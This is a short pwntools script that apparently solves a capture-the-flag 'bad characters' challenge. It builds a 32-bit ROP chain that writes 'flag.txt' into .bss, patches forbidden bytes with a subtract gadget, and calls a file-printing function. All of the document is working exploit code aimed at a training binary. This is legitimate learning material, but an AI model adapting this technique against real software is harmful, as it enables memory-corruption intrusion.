from pwn import *

junk = b'AAAA'
file = b'flag.txt'
forbidden = "xga."
printf_file = 0x80483d0

g1 = 0x0804854f #  mov    DWORD PTR [edi],esi; ret;
g2 = 0x080485b9 #  pop esi; pop edi; pop ebp; ret;
g3 = 0x080485b8 #  pop ebx; pop esi; pop edi; pop ebp; ret;
g4 = 0x0804854b # sub byte [ebp],bl
bss = 0x0804a020





def write_to(adr, s):
    if len(s)==0:
        return b""
    
    chain = p32(g2) + s[:4] + p32(adr) + junk + p32(g1)
    return chain + write_to(adr+4,s[4:])








payload = cyclic(44)
payload += write_to(bss,file)
for idx,c in enumerate(file):
    if chr(c) in forbidden:
        payload += p32(g3) + p32(0xAAAAAAeb - file[idx]) + junk + junk + p32(bss+idx) + p32(g4)

payload += p32(printf_file) + junk + p32(bss)


with open("payload", "wb") as f: f.write(payload)


